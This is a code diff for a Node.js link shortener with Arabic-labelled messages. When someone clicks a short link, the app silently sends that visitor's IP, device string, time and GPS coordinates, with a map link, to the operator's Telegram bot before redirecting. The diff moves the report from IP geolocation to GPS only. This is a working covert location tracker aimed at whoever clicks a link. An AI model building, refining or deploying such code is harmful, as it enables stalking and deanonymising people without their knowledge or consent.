@@ -19,41 +19,8 @@ function generateShortCode() {
   return crypto.randomBytes(4).toString('hex');
 }
 
-async function getIPLocation(ip) {
-  try {
-    const res = await axios.get(`http://ip-api.com/json/${ip}?fields=country,city,lat,lon,isp`, { timeout: 2000 });
-    if (res.data && res.data.status === 'success' && res.data.lat && res.data.lon) {
-      return {
-        country: res.data.country,
-        city: res.data.city,
-        latitude: res.data.lat,
-        longitude: res.data.lon,
-        isp: res.data.isp,
-        source: 'IP-Based'
-      };
-    }
-  } catch (e) { console.log('IP Geo fail'); }
-  return null;
-}
-
 async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
   try {
-    // إذا في GPS، استخدمه. إلا استخدم IP
-    let location = null;
-    let locationType = 'Unknown';
-
-    if (gps && gps.lat && gps.lng) {
-      location = {
-        latitude: gps.lat,
-        longitude: gps.lng,
-        accuracy: gps.accuracy
-      };
-      locationType = `GPS (${gps.accuracy.toFixed(0)}m)`;
-    } else {
-      location = await getIPLocation(ip);
-      locationType = location ? 'IP-Based' : 'Failed';
-    }
-
     let msg = `
 🔗 رابط جديد!
 ━━━━━━━━━━━
@@ -62,20 +29,24 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
 🔌 IP: ${ip}
 `;
 
-    if (location && location.latitude && location.longitude) {
+    if (gps && gps.lat && gps.lng) {
+      const accuracy = gps.accuracy ? gps.accuracy.toFixed(0) : '?';
       msg += `
-📍 Country: ${location.country || 'N/A'}
-🏙️ City: ${location.city || 'N/A'}
-📊 Latitude: ${location.latitude}
-📊 Longitude: ${location.longitude}
-🗺️ Maps: https://maps.google.com/?q=${location.latitude},${location.longitude}
-📡 Type: ${locationType}
+━━ موقع GPS ━━
+📍 دائرة العرض: ${gps.lat}
+📍 خط الطول: ${gps.lng}
+📏 الدقة: ±${accuracy} متر
+🗺️ الخريطة: https://maps.google.com/?q=${gps.lat},${gps.lng}
+📡 النوع: GPS (دقيق جداً)
 `;
     } else {
-      msg += `⚠️ Location: Not determined\n`;
+      msg += `
+⚠️ الموقع: لم يتم تفعيل GPS
+`;
     }
 
     msg += `
+━━━━━━━━━━━
 🖥️ Device: ${userAgent.substring(0, 50)}
 ⏰ ${new Date().toISOString()}
     `.trim();
@@ -83,8 +54,10 @@ async function sendToTelegram(ip, shortCode, originalUrl, userAgent, gps) {
     await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`,
       { chat_id: TELEGRAM_CHAT_ID, text: msg }
     );
+    
+    console.log('[Telegram] Message sent with GPS:', gps ? 'YES' : 'NO');
   } catch (err) {
-    console.error('Telegram Error:', err.message);
+    console.error('[Telegram] Error:', err.message);
   }
 }
 
@@ -93,7 +66,12 @@ app.post('/api/shorten', (req, res) => {
   if (!url) return res.status(400).json({ error: 'URL required' });
 
   const shortCode = generateShortCode();
-  linkStorage[shortCode] = { original: url, created: new Date(), clicks: 0, gps };
+  linkStorage[shortCode] = { 
+    original: url, 
+    created: new Date(), 
+    clicks: 0,
+    gps: gps || null
+  };
 
   const shortenedUrl = `${process.env.SHORT_DOMAIN || 'http://localhost:3000'}/${shortCode}`;
   res.json({ shortened: shortenedUrl, code: shortCode });
@@ -109,9 +87,12 @@ app.get('/:code', (req, res) => {
   const originalUrl = linkStorage[code].original;
 
   linkStorage[code].clicks++;
+  
+  console.log(`[Route] Code: ${code}, GPS: ${gps ? 'YES' : 'NO'}`);
+  
   sendToTelegram(ip, code, originalUrl, userAgent, gps);
   res.redirect(originalUrl);
 });
 
 const PORT = process.env.PORT || 3000;
-app.listen(PORT, () => console.log(`Running on ${PORT}`));
+app.listen(PORT, () => console.log(`Server on ${PORT}`));
